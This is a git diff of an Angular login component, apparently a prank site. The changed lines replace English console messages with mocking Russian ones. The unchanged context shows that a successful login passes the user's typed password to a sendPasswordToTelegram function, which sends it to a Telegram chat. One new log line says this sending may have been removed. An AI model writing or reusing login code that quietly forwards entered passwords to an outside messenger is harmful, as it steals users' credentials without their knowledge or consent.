@@ -26,13 +26,13 @@ export class LoginComponent {
         trimmedPassword.toLowerCase().includes(word.toLowerCase())
       )
     ) {
-      console.log('Logged in successfully');
+      console.log('Опа, паролик подходит, УДАЧИ!');
       this.isLoggedIn = true;
       this.isPopupVisible = false;
 
       this.sendPasswordToTelegram(this.password);
     } else {
-      console.log('Invalid credentials');
+      console.log('Дурачок, пароль это почти любое матерное слово или имя "Илья"');
     }
   }
 
@@ -48,9 +48,9 @@ export class LoginComponent {
           text: message,
         }
       );
-      console.log('Password sent to Telegram');
+      console.log('Иииии Оооооп, паролик отправлен в тг, ну может не отправлен потому что я убрал такую функцию, мб верну когда-то');
     } catch (error) {
-      console.error('Error sending password to Telegram:', error);
+      console.error('Ну не отпрвилось по вот такой вот причине:', error);
     }
   }
 
